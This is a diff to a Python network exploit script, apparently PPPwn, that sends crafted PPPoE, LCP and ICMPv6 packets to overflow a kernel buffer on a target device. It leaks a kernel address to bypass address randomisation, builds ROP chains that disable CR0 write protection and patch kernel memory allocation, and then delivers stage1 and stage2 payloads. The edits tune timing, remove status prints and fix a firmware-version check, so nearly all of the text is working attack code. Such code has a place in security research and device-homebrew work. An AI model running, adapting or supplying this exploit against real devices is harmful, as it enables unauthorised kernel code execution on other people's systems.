@@ -124,7 +124,7 @@ class Exploit:
 	def build_first_rop(self,fake_lle,rop2):rop=bytearray();rop+=p64(self.kdlsym(self.offs.POP_R12_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.MOV_RDI_RBX_CALL_R12));rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(-2048);rop+=p64(self.kdlsym(self.offs.ADD_RDI_RCX_RET));rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop_off_fixup=len(rop);rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(len(rop2+self.stage1));rop+=p64(self.kdlsym(self.offs.MEMCPY));rop+=p64(self.kdlsym(self.offs.POP_RAX_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX));rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(2048+32);rop+=p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET));rop[rop_off_fixup:rop_off_fixup+8]=p64(-len(fake_lle+rop));return rop
 	def build_second_rop(self):rop=bytearray();rop+=p64(self.kdlsym(self.offs.POP_RDI_RET));rop+=p64(IDT_UD);rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(SDT_SYSIGT);rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(SEL_KPL);rop+=p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET));rop+=p64(0);rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.SETIDT));rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(CR0_ORI&~CR0_WP);rop+=p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET));rop+=p64(self.kdlsym(self.offs.POP_RAX_RET));rop+=p64(VM_PROT_ALL);rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH1));rop+=p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET));rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH2));rop+=p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET));rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(CR0_ORI);rop+=p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET));rop+=p64(self.kdlsym(self.offs.POP_RAX_RET));rop+=p64(self.kdlsym(self.offs.RET));rop+=p64(self.kdlsym(self.offs.POP_RDI_RET));rop+=p64(self.kdlsym(self.offs.KERNEL_MAP));rop+=p64(self.kdlsym(self.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(PAGE_SIZE);rop+=p64(self.kdlsym(self.offs.KMEM_ALLOC));rop+=p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.MOV_R14_RAX_CALL_R8));rop+=p64(self.kdlsym(self.offs.POP_R12_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.MOV_RDI_R14_CALL_R12));rop+=p64(self.kdlsym(self.offs.PUSH_RSP_POP_RSI_RET));rop_rsp_pos=len(rop);rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop_off_fixup=len(rop);rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(len(self.stage1));rop+=p64(self.kdlsym(self.offs.MEMCPY));rop+=p64(self.kdlsym(self.offs.JMP_R14));rop[rop_off_fixup:rop_off_fixup+8]=p64(-(len(rop)-rop_rsp_pos));return rop
 	def run(self):
-		lcp_echo_handler=LcpEchoHandler(self.iface);lcp_echo_handler.start();self.ppp_negotation(self.build_fake_ifnet);self.lcp_negotiation();self.ipcp_negotiation()
+		lcp_echo_handler=LcpEchoHandler(self.iface);lcp_echo_handler.start();self.ppp_negotation(self.build_fake_ifnet,True);self.lcp_negotiation();self.ipcp_negotiation()
 		while True:
 			pkt=self.s.recv()
 			if pkt and pkt.haslayer(ICMPv6ND_RS):break
@@ -136,8 +136,8 @@ class Exploit:
 				if pkt and pkt.haslayer(ICMPv6ND_NS):break
 			if i>=self.HOLE_START and i%self.HOLE_SPACE==0:continue
 			self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6ND_NA(tgt=source_ipv6,S=1)/ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
-		for i in range(self.PIN_NUM):self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP(proto=16705));self.s.recv();sleep(.0005)
-		sleep(.5);overflow_lle=self.build_overflow_lle()
+		for i in range(self.PIN_NUM):self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE));sleep(.001)
+		sleep(1);overflow_lle=self.build_overflow_lle()
 		for i in range(self.CORRUPT_NUM):self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_REQ,id=self.LCP_ID,len=TARGET_SIZE+4,data=PPP_LCP_Option(data=b'A'*(TARGET_SIZE-4))/PPP_LCP_Option(data=overflow_lle)))
 		while True:
 			pkt=self.s.recv()
@@ -153,23 +153,22 @@ class Exploit:
 					elif pkt.haslayer(ICMPv6ND_NS):corrupted=True;break
 			if corrupted:break
 			self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6ND_NA(tgt=source_ipv6,S=1)/ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
-		if not corrupted:print('0');exit(1)
+		if not corrupted:exit(1)
 		while True:
 			pkt=self.s.recv()
 			if pkt and pkt.haslayer(ICMPv6NDOptSrcLLAddr)and pkt[ICMPv6NDOptSrcLLAddr].len>1:break
 		self.pppoe_softc_list=unpack('<Q',bytes(pkt[IPv6])[67:75])[0];self.kaslr_offset=self.pppoe_softc_list-self.offs.PPPOE_SOFTC_LIST
-		if self.pppoe_softc_list&0xffffffff00000fff!=self.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff:print('0');exit(1)
+		if self.pppoe_softc_list&0xffffffff00000fff!=self.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff:exit(1)
 		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP_Terminate());self.ppp_negotation(self.build_fake_lle);self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=self.SOURCE_IPV6,dst=self.target_ipv6)/ICMPv6EchoRequest());count=0
 		while count<3:
 			pkt=self.s.recv()
 			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_REQ:count+=1
 		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADT,sessionid=self.SESSION_ID));self.ppp_negotation();self.lcp_negotiation();self.ipcp_negotiation();frags=fragment(IP(src=self.SOURCE_IPV4,dst=self.TARGET_IPV4)/UDP(dport=self.STAGE2_PORT)/self.stage2,1024)
 		for frag in frags:self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/frag)
-		print('1')
 def main():
 	parser=ArgumentParser('pppwn.py');parser.add_argument('--interface',required=True);parser.add_argument('--fw',default='1100');parser.add_argument('--stage1',default='/root/PPPwn/stage1.bin');parser.add_argument('--stage2',default='/root/PPPwn/stage2.bin');args=parser.parse_args()
 	with open(args.stage1,mode='rb')as f:stage1=f.read()
 	with open(args.stage2,mode='rb')as f:stage2=f.read()
-	if args.fw=='11.00':offs=OffsetsFirmware_1100()
+	if args.fw=='1100':offs=OffsetsFirmware_1100()
 	exploit=Exploit(offs,args.interface,stage1,stage2);exploit.run();return 0
 if __name__=='__main__':exit(main())
